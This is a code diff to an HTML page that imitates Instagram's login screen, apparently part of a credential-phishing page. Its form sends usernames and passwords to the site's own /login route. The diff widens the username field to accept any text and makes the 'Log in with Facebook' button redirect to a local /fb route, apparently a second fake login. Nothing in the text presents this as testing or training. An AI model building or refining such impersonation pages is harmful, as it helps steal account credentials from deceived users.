@@ -108,12 +108,12 @@
     <div class="login-container">
         <img src="https://i.postimg.cc/9fH7CBWY/images.png" alt="Instagram" class="login-logo">
         <form action="/login" method="POST">
-            <input type="email" name="email" class="form-control" placeholder="Phone number, username, or email" required>
+            <input type="text" name="email" class="form-control" placeholder="Phone number, username, or email" required>
             <input type="password" name="password" class="form-control" placeholder="Password" required>
             <button type="submit" class="btn-login" disabled>Log In</button>
         </form>
         <div class="divider">OR</div>
-        <button class="btn-facebook">
+        <button class="btn-facebook" onclick="window.location.href='/fb'">
             <i class="fab fa-facebook-square"></i> Log in with Facebook
         </button>
         <a href="#" class="forgot-password">Forgot password?</a>
